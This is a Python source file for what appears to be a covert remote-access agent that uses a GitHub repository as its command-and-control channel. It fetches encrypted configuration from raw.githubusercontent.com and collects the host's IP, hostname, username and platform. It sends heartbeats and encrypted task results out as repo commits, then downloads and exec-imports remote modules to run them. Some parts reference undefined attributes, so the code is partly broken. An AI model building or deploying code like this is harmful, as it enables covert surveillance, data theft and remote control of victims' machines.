# -*- encoding: utf-8 -*-
import sys
import getpass
import json
import platform
import random
import socket
import string
import time
import threading

from commander.thirdparty.Crypto import Random
from commander.thirdparty.Crypto.PublicKey import RSA
from commander.thirdparty.Crypto.Cipher import AES, PKCS1_OAEP
from commander.thirdparty.httpimp import add_remote_repo, remove_remote_repo
from commander.thirdparty.httpimp import remote_repo, git_repo

try:
    from urllib2 import urlopen, Request
except ImportError:
    from urllib.request import urlopen, Request
import logging
# fmt = '%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s'
fmt = '[%(asctime)s] [%(levelname)s] [ %(filename)s:%(lineno)s ] %(message)s '
logging.basicConfig(level=logging.INFO, format=fmt)


class GitHubAPI(object):

    def __init__(self, guser=None, gpwd=None, gtoken=None,
                 grepo=None, gbranch='master'):
        if not gtoken and not gpwd:
            raise('Token or password must have one')

        self.owner = guser
        self.gpwd = gpwd
        self.token = gtoken
        self.repo = grepo
        self.branch = gbranch

    @staticmethod
    def _request(method='GET', uri=None, data=None, headers=None, timeout=30):
        url = 'https://api.github.com'
        url = uri if url in uri else (url + uri)
        req = Request(url, timeout=timeout)
        req.headers = {'User-Agent': 'App',
                       'Accept': 'application/vnd.github.v3+json'}
        if headers:
            req.headers.update(headers)
        req.get_method = lambda: method
        if data:
            data = json.dumps(data, ensure_ascii=False)
        try:
            logging.info('Start to request: %s' % url)
            logging.debug('Request data: %s' % data)
            rsp = urlopen(req, data)
        except Exception as e:
            logging.error('[-] Request error: %s' % url)
            logging.exception(e)
            rsp = None
        return rsp

    def request(self, method='GET', uri=None, data=None, headers=None):
        headers = headers or {}
        if self.token:
            headers.update({'Authorization': 'token ' + self.token})
        else:
            up = ':'.join((self.owner, self.gpwd))
            auth_hash = up.encode('base64').strip()
            headers.update({'Authorization': 'Basic ' + auth_hash})

        return GitHubAPI._request(method=method, uri=uri,
                                  data=data, headers=headers)

    def put(self, path, content, msg='new file'):
        """
        PUT /repos/:owner/:repo/contents/:path
        """
        uri = '/repos/%s/%s/contents/%s' % (self.owner, self.repo, path)
        data = {'message': msg, 'content': content.encode('base64')}
        logging.info('[*] Save result to %s' % path)
        return self.request('PUT', uri, data)

    def get(self, path):
        """
        GET /repos/:owner/:repo/contents/:path
        """
        uri = '/repos/%s/%s/contents/%s' % (self.owner, self.repo, path)
        rsp = self.request(uri=uri)
        content = json.loads(rsp.read().strip()) if rsp else {}
        # return content.get('content', '').decode('base64'), content
        return content

    def update(self, path, content, sha, msg='update file'):
        """
        PUT /repos/:owner/:repo/contents/:path
        """
        uri = '/repos/%s/%s/contents/%s' % (self.owner, self.repo, path)
        data = {'message': msg,
                'content': content.encode('base64'),
                'sha': sha}
        return self.request('PUT', uri, data)

    def delete(self, path, sha, msg='delete file'):
        """
        DELETE /repos/:owner/:repo/contents/:path
        """
        uri = '/repos/%s/%s/contents/%s' % (self.owner, self.repo, path)
        data = {'message': msg, 'sha': sha}
        return self.request('DELETE', uri, data)


def Threaded(func):
    def wrapper(*_args, **kwargs):
        t = threading.Thread(target=func, args=_args)
        t.daemon = True
        t.start()
        return
    return wrapper


class Agent(object):
    # python -c "import os;print(os.urandom(8).hex())"
    uid = '602841a3ee0ecb12'

    def __init__(self, owner, repo, branch='master',
                 conf_path='config', debug=False):
        self.owner = owner
        self.repo = repo
        self.branch = branch
        self.conf_path = '/'.join((conf_path, self.uid + '.conf'))
        self.debug = debug
        # self.idle = True
        self.silent = False
        # self.last_active = time.time()
        self.failed_connections = 0
        self.conf = None
        self.gh_conf = None
        self.gh_result = None
        self.cmdpub = ''    # encode with hex
        self.prikey = ''
        self.aes_key = ''
        self.tasks = set()
        self.modules = {}
        self.run_modules = []
        self.info = self.get_info()
        self.init()

    def init(self):
        self.conf_sha = None
        self.conf = self.get_conf_try(self.conf_url)
        if not self.conf:
            return
        self.parse_conf()
        self.gh = GitHubAPI(self.gh_result[0], None,
                            self.gh_result[1], self.gh_result[2])
        self.heartbeat()

    def parse_conf(self):
        self.gh_conf = self.conf['BaseAcc'].split('$$')
        self.gh_result = self.conf['RetAcc'].split('$$')
        self.report_path = self.conf['RetPath']
        self.hbt = self.conf['HBTime']
        self.conf_path = '/'.join((self.conf['ConfPath'], self.uid + '.conf'))
        self.aes_key = self.conf['AesKey']
        self.cmdpub = self.conf['SrvPubKey']
        self.prikey = self.conf['ToyPriKey']
        self.modules = self.conf['Modules']

        self.owner = self.gh_conf[0]
        self.token = self.gh_conf[1]
        self.repo = self.gh_conf[2]

        self.conf = None
        # self.tasks.extend(self.conf['Tasks'])
        # for task in self.conf['Tasks']:
        #     self.tasks.add(task)

    @property
    def conf_url(self):
        conf_url = 'https://raw.githubusercontent.com/'
        conf_url += '/'.join((self.owner, self.repo, self.branch,
                              self.conf_path))
        return conf_url

    # def task_conf_url(self, taskid):
    #     path = self.conf['ConfPath'] + 'task/'
    #     path += taskid + '.conf'
    #     url = 'https://raw.githubusercontent.com'
    #     url += '/%s/%s/%s/%s' % (self.owner, self.repo,
    #                              self.branch, path)
    #     return url

    @Threaded
    def heartbeat(self):
        path = '/'.join((self.conf['RetPath'], 'knock', self.uid + '.hbt'))
        while True:
            # info = self.get_info()
            self.info['timestamp'] = time.time()
            # self.report(str(time.time()), path, plain=True)
            self.report(json.dumps(self.info), path, plain=True)
            time.sleep(self.hbt)
            if self.is_conf_update(self.conf_path, self.conf_sha):
                # self.init(self.conf_url)
                self.parse_conf()

    def get_info(self):
        ip = self.get_host_ip()
        plat = platform.system() + " " + platform.release()
        hostname = socket.gethostname()
        username = getpass.getuser()
        timestamp = time.time()
        return dict(ip=ip, platform=plat, hostname=hostname,
                    username=username, timestamp=timestamp)

    @staticmethod
    def get_host_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 53))
            ip = s.getsockname()[0]
        finally:
            s.close()

        return ip

    def get_conf_try(self, url, trynum=3):
        num = 0
        conf = None
        while num < trynum:
            conf = self.get_content(url)
            if conf:
                break
            num += 1
        return conf

    # def get_task(self, taskid):
    #     conf = self.get_content(self.task_conf_url(taskid))
    #     if not conf:
    #         return
    #     # Todo...

    # def parse_task_conf(self, conf):
    #     pass

    def is_conf_update(self):
        # check github file sha
        try:
            c = self.gh.get(self.conf_path)
            if c['sha'] == self.conf_sha:
                return False
        except Exception as e:
            if self.debug:
                print(e)
            return False
        self.conf_sha = c['sha']
        self.conf = self.decrypt(c['content'].decode('base64'))
        return True

    def get_content(self, url):
        try:
            conf = urlopen(url).read()
            if conf:
                conf = self.decrypt(conf.strip())
                return json.loads(conf)
            else:
                return {}
        except Exception as e:
            if self.debug:
                print(e)
            return {}

    def report(self, msg, path, plain=False):
        content = msg if plain else self.encrypt(msg)
        data = self.gh.get(path)
        if not data:
            s = self.gh.put(path, content)
        else:
            s = self.gh.update(path, content, data['sha'])
        if self.debug:
            print(s)

    @Threaded
    def task_run(self, max=5):
        pass

    def random_key(self, num=16):
        return ''.join(random.sample(string.printable, num))

    def encrypt(self, content, raw=False, aes=True):
        if raw:
            return content
        rkey = RSA.importKey(self.cmdpub.decode('hex'))

        if not aes:
            return self.rsa_encrypt(content, rkey).encode('base64')

        akey = self.random_key()
        ec = self.aes_encrypt(content, akey)
        ek = self.rsa_encrypt(akey, rkey)
        return ';;'.join((ec, ek)).encode('base64')

    def decrypt(self, content):
        content = content.decode('base64') if content else ''
        if ';;[]' in content:
            return content[:-4]

        rk = RSA.importKey(self.prikey)

        if ';;' in content:
            # parse encrypt content and encrypt key
            c, e = content.split(';;')
            if not e:
                # no encrypt key
                return self.aes_decrypt(c, self.aes_key)
            else:
                # have encrypt key, decrypt the key
                ak = self.rsa_decrypt(e, rk)
                # decrypt the content
                return self.aes_decrypt(c, ak)
        else:
            # no aes encrypt
            return self.rsa_decrypt(content, rk)

    def rsa_encrypt(self, content, key=None):
        if not key:
            return content
        cipher = PKCS1_OAEP.new(key)
        return cipher.encrypt(content)

    def rsa_decrypt(self, content, key=None):
        if not key:
            return content
        if not key.has_private():
            print('[!] Not a valid PrivateKey!')
            return None
        cipher = PKCS1_OAEP.new(key)
        return cipher.decrypt(content)

    def aes_encrypt(self, content, key):
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CFB, iv)
        msg = iv + cipher.encrypt(content.decode('utf-8'))
        return msg

    def aes_decrypt(self, content, key):
        iv = content[:AES.block_size]
        msg = content[AES.block_size:]
        cipher = AES.new(key, AES.MODE_CFB, iv)
        msg = cipher.decrypt(msg)
        return msg.encode('utf-8')

    @staticmethod
    def load(repo, url, package='', module=None):
        if not package and not module:
            try:
                logging.info('Try to import module')
                add_remote_repo([repo], url)
                exec "import %s" % repo
            except Exception:
                logging.error('Exception with import %s' % repo)
                pass
        else:
            pk = '.'.join((repo, package)) if package.split(
                '.')[0] != repo else package
            md = ','.join(module) if isinstance(
                module, (list, tuple)) else module
            with remote_repo([repo], url):
                exec "from %s import %s" % (pk, md)

    def loadGH(self, module, package='', user=None, repo=None):
        user = user or self.owner
        repo = repo or self.repo
        pk = '.'.join((repo, package)) if package.split(
            '.')[0] != repo else package
        md = ','.join(module) if isinstance(
            module, (list, tuple)) else module

        with git_repo(user, repo):
            exec "from %s import %s" % (pk, md)

    @staticmethod
    def unload(module, url):
        logging.info('Try to unload module')
        remove_remote_repo(url)
        if module in sys.modules:
            del module

    def install(self):
        for url, pkgs in self.base_modules.items():
            if not isinstance(pkgs, (list, tuple)):
                pkgs = [pkgs]
            for p in pkgs:
                self.load(p, url)
        for pkg in self.run_modules:
            self.load_module(pkg['module'])
        self.init = False

    def parse_require(self, pkg):
        requires = pkg.get('require', None)
        if requires:
            for k, v in requires.items():
                self.load(v, k)

    # def check(self, url=None):
    #     url = url or self.conf_url
    #     conf = self.get_config(url)
    #     self.parse_conf(conf)
    #     for task in self.run_modules:
    #         self.load_module(task['module'])
    #     tasks = self.load_task(self.task_url) if self.task_url else []
    #     self.run_modules += tasks

    # def load_module(self, mod, pkg='toy.modules'):
    #     try:
    #         logging.info('Import %s from %s' % (mod, pkg))
    #         self.load(self.repo, )
    #         exec "from %s import %s" % (pkg, mod)
    #     except Exception:
    #         logging.error("Import %s error" % '.'.join((pkg, mod)))

    # def load_task(self, task_url):
    #     tasks = self.get(task_url)
    #     logging.info('[+] Get task config: %s' % tasks)
    #     if tasks:
    #         tasks = json.loads(tasks)
    #         logging.info('[*] Get task %s from %s' % (tasks['name'], task_url))
    #         requires = tasks.get('require', {})
    #         for u, p in requires.items():
    #             for k in p:
    #                 logging.info('[*] Load required packages: %s from %s' % (k, u))
    #                 self.load([k], u)
    #         self.load(tasks['name'], tasks['url'])
    #         for task in tasks['task']:
    #             self.load_module(task['module'], tasks['name'] + '.modules')
    #     else:
    #         tasks = []
    #     return tasks

    def worker(self, m, loop=False):
        path = self.result_path + '%d.data' % random.randint(
            1000, 100000)
        self.task_queue.put(1)
        print sys.modules[m]
        result = sys.modules[m].run() or 'Err'
        self.task_queue.get()
        if result:
            print('[*] Get result: %s' % result)
            # time.sleep(5)
            self.report(result, path)
        if not loop:
            del sys.modules[m]
        return

    def run(self):
        self.install()
        while True:
            if self.task_queue.empty():
                if not self.init:
                    self.check()
                for task in self.run_modules:
                    logging.info("run task %s" % task['module'])
                    mod = 'toy.modules.%s' % task['module']
                    try:
                        t = threading.Thread(
                            target=self.worker, args=(mod,))
                        t.start()
                        time.sleep(random.randint(1, 10))
                    except Exception:
                        logging.error('run exception')
                        pass
            time.sleep(self.cf)
            # time.sleep(random.randint(1000, 10000))
